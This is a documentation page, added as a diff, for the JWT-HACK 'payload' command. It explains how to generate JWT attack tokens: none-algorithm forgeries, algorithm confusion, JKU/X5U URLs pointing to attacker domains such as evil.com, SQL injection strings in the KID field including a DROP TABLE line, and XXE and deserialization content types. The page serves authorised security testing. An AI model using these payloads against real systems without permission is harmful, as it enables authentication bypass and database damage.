@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <title>Payload Command - JWT-HACK</title>
+  <meta property="og:title" content="Payload Command">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://localhost:3000/usage/commands/payload/">
+<meta property="og:image" content="http://localhost:3000/images/preview.jpg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Payload Command">
+<meta name="twitter:image" content="http://localhost:3000/images/preview.jpg">
+<meta name="twitter:site" content="@hahwul">
+<meta name="twitter:creator" content="@hahwul">
+  <link rel="icon" href="http://localhost:3000/favicon.ico">
+  <link rel="stylesheet" href="http://localhost:3000/css/style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  
+  <script>
+    (function() {
+      var theme = localStorage.getItem('theme') || 'dark';
+      document.documentElement.setAttribute('data-theme', theme);
+    })();
+  </script>
+</head>
+<body>
+<header class="site-header">
+  <div class="header-left">
+    <a href="http://localhost:3000/" class="header-logo">
+      <img src="http://localhost:3000/images/jwt-hack-dark.png" alt="JWT-HACK" class="logo-dark">
+      <img src="http://localhost:3000/images/jwt-hack-light.png" alt="JWT-HACK" class="logo-light">
+    </a>
+    <nav class="header-nav">
+      <a href="http://localhost:3000/get_started/introduction/">Docs</a>
+      <a href="http://localhost:3000/usage/commands/">Commands</a>
+      <a href="https://github.com/hahwul/jwt-hack" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://crates.io/crates/jwt-hack" target="_blank" rel="noopener">Crates</a>
+    </nav>
+  </div>
+  <div class="header-right">
+    <span class="version-badge">v2.5.0</span>
+    <button id="theme-toggle" class="theme-toggle" aria-label="Toggle theme">
+      <svg class="icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
+      <svg class="icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+    </button>
+    <button id="mobile-menu-btn" class="mobile-menu-btn" aria-label="Toggle menu">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+    </button>
+  </div>
+</header>
+
+<div class="docs-layout">
+  <div id="sidebar-overlay" class="sidebar-overlay"></div>
+<aside class="docs-sidebar">
+  <!-- Get Started -->
+  <div class="sidebar-section">
+    <div class="sidebar-title">Get Started</div>
+    <ul class="sidebar-links">
+      <li><a href="http://localhost:3000/get_started/introduction/">Introduction</a></li>
+      <li><a href="http://localhost:3000/get_started/installation/">Installation</a></li>
+      <li><a href="http://localhost:3000/get_started/quickstart/">Quick Start</a></li>
+    </ul>
+  </div>
+
+  <!-- Usage -->
+  <div class="sidebar-section">
+    <div class="sidebar-title">Usage</div>
+    <ul class="sidebar-links">
+      <li><a href="http://localhost:3000/usage/commands/">Commands</a></li>
+      <ul class="sidebar-sublinks">
+        <li><a href="http://localhost:3000/usage/commands/decode/">decode</a></li>
+        <li><a href="http://localhost:3000/usage/commands/encode/">encode</a></li>
+        <li><a href="http://localhost:3000/usage/commands/verify/">verify</a></li>
+        <li><a href="http://localhost:3000/usage/commands/crack/">crack</a></li>
+        <li><a href="http://localhost:3000/usage/commands/payload/">payload</a></li>
+        <li><a href="http://localhost:3000/usage/commands/scan/">scan</a></li>
+        <li><a href="http://localhost:3000/usage/commands/server/">server</a></li>
+        <li><a href="http://localhost:3000/usage/commands/mcp/">mcp</a></li>
+      </ul>
+      <li><a href="http://localhost:3000/usage/examples/">Examples</a></li>
+      <li><a href="http://localhost:3000/usage/configuration/">Configuration</a></li>
+    </ul>
+  </div>
+
+  <!-- Advanced -->
+  <div class="sidebar-section">
+    <div class="sidebar-title">Advanced</div>
+    <ul class="sidebar-links">
+      <li><a href="http://localhost:3000/advanced/performance-optimization/">Performance</a></li>
+      <li><a href="http://localhost:3000/advanced/scripting-automation/">Scripting & Automation</a></li>
+    </ul>
+  </div>
+
+  <!-- Reference -->
+  <div class="sidebar-section">
+    <div class="sidebar-title">Reference</div>
+    <ul class="sidebar-links">
+      <li><a href="http://localhost:3000/reference/environment-variables/">Environment Variables</a></li>
+    </ul>
+  </div>
+
+  <!-- Support -->
+  <div class="sidebar-section">
+    <div class="sidebar-title">Support</div>
+    <ul class="sidebar-links">
+      <li><a href="http://localhost:3000/support/troubleshooting/">Troubleshooting</a></li>
+      <li><a href="http://localhost:3000/support/faq/">FAQ</a></li>
+      <li><a href="http://localhost:3000/support/community/">Community</a></li>
+      <li><a href="http://localhost:3000/support/contributing/">Contributing</a></li>
+    </ul>
+  </div>
+</aside>
+  <main class="docs-main">
+    <div class="docs-content">
+      <h1>Payload Command</h1>
+      <p>The <code>payload</code> command generates various JWT attack payloads for security testing and vulnerability assessment.</p>
+<h2 id="basic-usage">Basic Usage</h2>
+<pre><code class="language-bash hljs">jwt-hack payload &lt;TOKEN&gt; [OPTIONS]
+</code></pre>
+<h2 id="attack-payload-types">Attack Payload Types</h2>
+<h3 id="none-algorithm-attack">None Algorithm Attack</h3>
+<p>Remove signature verification requirement:</p>
+<pre><code class="language-bash hljs">jwt-hack payload &lt;TOKEN&gt; --target=none
+</code></pre>
+<p>Generates payloads with:</p>
+<ul>
+<li><code>alg: &quot;none&quot;</code> (lowercase)</li>
+<li><code>alg: &quot;None&quot;</code> (capitalized)</li>
+<li><code>alg: &quot;NONE&quot;</code> (uppercase)</li>
+<li>Various case combinations</li>
+</ul>
+<h3 id="algorithm-confusion-attack">Algorithm Confusion Attack</h3>
+<p>Convert RSA tokens to HMAC using public key as secret:</p>
+<pre><code class="language-bash hljs">jwt-hack payload &lt;RSA_TOKEN&gt; --target=alg_confusion
+</code></pre>
+<p>Creates payloads that:</p>
+<ul>
+<li>Change algorithm from RS256 to HS256</li>
+<li>Use public key content as HMAC secret</li>
+<li>Test algorithm substitution vulnerabilities</li>
+</ul>
+<h3 id="jkux5u-url-attacks">JKU/X5U URL Attacks</h3>
+<p>Manipulate JSON Web Key URLs:</p>
+<pre><code class="language-bash hljs"># Basic JKU/X5U attack
+jwt-hack payload &lt;TOKEN&gt; --target=jku
+
+# With trusted domain bypass
+jwt-hack payload &lt;TOKEN&gt; --jwk-trust=trusted.com --jwk-attack=evil.com
+
+# Custom protocol and attack domain
+jwt-hack payload &lt;TOKEN&gt; --jwk-attack=attacker.com --jwk-protocol=http
+</code></pre>
+<p>Generates payloads with:</p>
+<ul>
+<li>Malicious JKU URLs pointing to attacker-controlled keys</li>
+<li>X5U URLs for certificate chain manipulation</li>
+<li>Domain bypass techniques</li>
+<li>Protocol downgrade attacks</li>
+</ul>
+<h3 id="kid-sql-injection">KID SQL Injection</h3>
+<p>Inject SQL payloads in Key ID field:</p>
+<pre><code class="language-bash hljs">jwt-hack payload &lt;TOKEN&gt; --target=kid_sql
+</code></pre>
+<p>Generates payloads with SQL injection vectors:</p>
+<ul>
+<li><code>' OR 1=1--</code></li>
+<li><code>'; DROP TABLE users;--</code></li>
+<li><code>' UNION SELECT null--</code></li>
+<li>Time-based blind SQL injection payloads</li>
+</ul>
+<h3 id="x5c-certificate-injection">X5C Certificate Injection</h3>
+<p>Inject malicious certificate chains:</p>
+<pre><code class="language-bash hljs">jwt-hack payload &lt;TOKEN&gt; --target=x5c
+</code></pre>
+<p>Creates payloads with:</p>
+<ul>
+<li>Malicious certificate chains</li>
+<li>Self-signed certificates</li>
+<li>Certificate with custom extensions</li>
+<li>Chain validation bypass attempts</li>
+</ul>
+<h3 id="cty-content-type-attacks">CTY Content Type Attacks</h3>
+<p>Manipulate content type headers for XXE and deserialization:</p>
+<pre><code class="language-bash hljs">jwt-hack payload &lt;TOKEN&gt; --target=cty
+</code></pre>
+<p>Generates payloads with content types for:</p>
+<ul>
+<li><code>text/xml</code> - XML External Entity (XXE) attacks</li>
+<li><code>application/xml</code> - XML processing vulnerabilities</li>
+<li><code>application/x-java-serialized-object</code> - Java deserialization</li>
+<li><code>application/json+x-jackson-smile</code> - Jackson deserialization</li>
+</ul>
+<h2 id="generate-all-payload-types">Generate All Payload Types</h2>
+<p>Create comprehensive attack payload set:</p>
+<pre><code class="language-bash hljs"># Generate all attack types
+jwt-hack payload &lt;TOKEN&gt; --target=all
+
+# All attacks with custom domains
+jwt-hack payload &lt;TOKEN&gt; --target=all --jwk-attack=evil.com --jwk-trust=trusted.com
+</code></pre>
+<h2 id="command-options">Command Options</h2>
+<h3 id="required">Required</h3>
+<ul>
+<li><code>&lt;TOKEN&gt;</code> - Base JWT token for payload generation</li>
+</ul>
+<h3 id="target-selection">Target Selection</h3>
+<ul>
+<li><code>--target &lt;TYPE&gt;</code> - Payload types: <code>all</code>, <code>none</code>, <code>jku</code>, <code>x5u</code>, <code>alg_confusion</code>, <code>kid_sql</code>, <code>x5c</code>, <code>cty</code></li>
+</ul>
+<h3 id="jkux5u-attack-options">JKU/X5U Attack Options</h3>
+<ul>
+<li><code>--jwk-trust &lt;DOMAIN&gt;</code> - Trusted domain for bypass techniques</li>
+<li><code>--jwk-attack &lt;DOMAIN&gt;</code> - Attacker-controlled domain</li>
+<li><code>--jwk-protocol &lt;PROTOCOL&gt;</code> - Protocol to use (http/https, default: https)</li>
+</ul>
+<h2 id="output-format">Output Format</h2>
+<p>Payloads are displayed with:</p>
+<ul>
+<li>Attack type identifier</li>
+<li>Modified JWT token</li>
+<li>Description of the attack vector</li>
+<li>Usage recommendations</li>
+</ul>
+<p>Example output:</p>
+<pre><code>🎯 None Algorithm Attack Payloads:
+
+[1] None Algorithm (lowercase)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
+
+[2] None Algorithm (capitalized)
+eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
+
+[3] None Algorithm (uppercase)
+eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
+</code></pre>2 id="attack-scenarios">Attack Scenarios</h2>
+<h3 id="testing-authentication-bypass">Testing Authentication Bypass</h3>
+<pre><code class="language-bash hljs"># Test if application accepts unsigned tokens
+jwt-hack payload &lt;TOKEN&gt; --target=none
+
+# Test each generated payload:
+curl -H &quot;Authorization: Bearer &lt;NONE_PAYLOAD&gt;&quot; https://api.example.com/user
+</code></pre>
+<h3 id="algorithm-confusion-testing">Algorithm Confusion Testing</h3>
+<pre><code class="language-bash hljs"># Generate algorithm confusion payloads
+jwt-hack payload &lt;RSA_TOKEN&gt; --target=alg_confusion
+
+# Test with public key content as HMAC secret
+curl -H &quot;Authorization: Bearer &lt;CONFUSED_PAYLOAD&gt;&quot; https://api.example.com/admin
+</code></pre>
+<h3 id="key-url-manipulation">Key URL Manipulation</h3>
+<pre><code class="language-bash hljs"># Test JKU/X5U URL attacks
+jwt-hack payload &lt;TOKEN&gt; --target=jku --jwk-attack=attacker.com
+
+# Host malicious JWK at attacker.com/keys.json
+# Test if application fetches keys from attacker URL
+</code></pre>
+<h3 id="sql-injection-in-kid">SQL Injection in KID</h3>
+<pre><code class="language-bash hljs"># Generate KID SQL injection payloads
+jwt-hack payload &lt;TOKEN&gt; --target=kid_sql
+
+# Test each payload for SQL injection responses
+# Monitor application logs for SQL errors
+</code></pre>
+<h2 id="security-testing-workflow">Security Testing Workflow</h2>
+<h3 id="1-reconnaissance">1. Reconnaissance</h3>
+<pre><code class="language-bash hljs"># Decode token to understand structure
+jwt-hack decode &lt;TOKEN&gt;
+
+# Generate comprehensive payload set
+jwt-hack payload &lt;TOKEN&gt; --target=all
+</code></pre>
+<h3 id="2-systematic-testing">2. Systematic Testing</h3>
+<pre><code class="language-bash hljs"># Test none algorithm bypasses
+jwt-hack payload &lt;TOKEN&gt; --target=none
+
+# Test each payload systematically
+# Document responses and behaviors
+</code></pre>
+<h3 id="3-advanced-attacks">3. Advanced Attacks</h3>
+<pre><code class="language-bash hljs"># Algorithm confusion (if RSA token)
+jwt-hack payload &lt;RSA_TOKEN&gt; --target=alg_confusion
+
+# URL manipulation attacks
+jwt-hack payload &lt;TOKEN&gt; --target=jku --jwk-attack=controlled-domain.com
+</code></pre>
+<h2 id="payload-customization">Payload Customization</h2>
+<h3 id="custom-domains">Custom Domains</h3>
+<pre><code class="language-bash hljs"># Use specific attack domains
+jwt-hack payload &lt;TOKEN&gt; --target=jku --jwk-attack=evil.hacker.com
+
+# Bypass domain restrictions
+jwt-hack payload &lt;TOKEN&gt; --target=x5u --jwk-trust=trusted.com --jwk-attack=evil.com
+</code></pre>
+<h3 id="protocol-selection">Protocol Selection</h3>
+<pre><code class="language-bash hljs"># Force HTTP for testing
+jwt-hack payload &lt;TOKEN&gt; --target=jku --jwk-protocol=http --jwk-attack=attacker.com
+
+# Test protocol downgrade vulnerabilities
+</code></pre>
+<h2 id="integration-with-testing-frameworks">Integration with Testing Frameworks</h2>
+<h3 id="burp-suite-integration">Burp Suite Integration</h3>
+<ol>
+<li>Generate payloads with JWT-HACK</li>
+<li>Import into Burp Intruder</li>
+<li>Use as payload list for systematic testing</li>
+</ol>
+<h3 id="custom-scripts">Custom Scripts</h3>
+<pre><code class="language-bash hljs"># Generate and test programmatically
+jwt-hack payload &lt;TOKEN&gt; --target=all &gt; payloads.txt
+
+# Process payloads in custom testing script
+while read payload; do
+    test_jwt_payload &quot;$payload&quot;
+done &lt; payloads.txt
+</code></pre>
+<h2 id="best-practices">Best Practices</h2>
+<h3 id="responsible-testing">Responsible Testing</h3>
+<ul>
+<li>Only test applications you own or have permission to test</li>
+<li>Document all findings appropriately</li>
+<li>Follow responsible disclosure practices</li>
+</ul>
+<h3 id="comprehensive-coverage">Comprehensive Coverage</h3>
+<ul>
+<li>Test all payload types systematically</li>
+<li>Combine with other testing techniques</li>
+<li>Verify results manually when automated tools indicate vulnerabilities</li>
+</ul>
+
+    </div>
+  </main>
+</div>
+
+<footer class="site-footer">
+  <div class="footer-content">
+    <a href="https://www.hahwul.com" target="_blank" rel="noopener noreferrer">
+      <img src="https://www.hahwul.com/images/logo.webp" alt="HAHWUL" class="footer-logo">
+    </a>
+    <span class="separator">&bull;</span>
+    <span>Powered by <a href="https://github.com/hahwul/hwaro" target="_blank" rel="noopener">Hwaro</a></span>
+  </div>
+</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+
+<script>
+  // Theme toggle
+  document.addEventListener('DOMContentLoaded', function() {
+    var toggle = document.getElementById('theme-toggle');
+    if (toggle) {
+      toggle.addEventListener('click', function() {
+        var html = document.documentElement;
+        var current = html.getAttribute('data-theme');
+        var next = current === 'dark' ? 'light' : 'dark';
+        html.setAttribute('data-theme', next);
+        localStorage.setItem('theme', next);
+      });
+    }
+
+    // Mobile menu
+    var menuBtn = document.getElementById('mobile-menu-btn');
+    var sidebar = document.querySelector('.docs-sidebar');
+    var overlay = document.getElementById('sidebar-overlay');
+    if (menuBtn && sidebar) {
+      menuBtn.addEventListener('click', function() {
+        sidebar.classList.toggle('open');
+        if (overlay) overlay.classList.toggle('active');
+      });
+      if (overlay) {
+        overlay.addEventListener('click', function() {
+          sidebar.classList.remove('open');
+          overlay.classList.remove('active');
+        });
+      }
+    }
+
+    // Active sidebar link
+    var links = document.querySelectorAll('.sidebar-links a');
+    var path = window.location.pathname.replace(/\/$/, '') || '/';
+    links.forEach(function(link) {
+      var href = link.getAttribute('href').replace(/\/$/, '') || '/';
+      if (href === path) {
+        link.classList.add('active');
+      }
+    });
+  });
+</script>
+</body>
+</html>
